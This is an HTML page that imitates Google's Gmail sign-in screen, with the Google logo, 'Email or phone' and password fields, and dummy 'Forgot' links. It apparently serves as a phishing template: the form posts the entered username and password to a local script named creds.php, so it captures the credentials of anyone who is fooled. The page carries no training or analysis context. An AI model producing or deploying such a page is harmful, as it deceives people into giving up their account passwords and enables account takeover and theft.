<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" type="text/css" href="google.css">
		<link href='https://fonts.googleapis.com/css?family=Actor' rel='stylesheet'>
	</head>
	<body>
		<div id="hero">
			
			<img id="googlelogo" src="google.png" alt="Google">

			<h1>Sign in</h1>

			<h2>to continue to Gmail</h2>
			<div id="notcenter">
				<form method="post" action="../creds.php">
					<input type="text" name="username" id="txtin" placeholder="Email or phone">
					<p><a href="#"><strong>Forgot email?</strong></a></p>
					<input type="password" name="password" id="txtin" placeholder="Enter your password">
					<p><a href="#"><strong>Forgot password?</strong></a></p>
					<input type="submit" value="Next" id="submit">
				</form>
			</div>
		</div>
	</body>
</html>
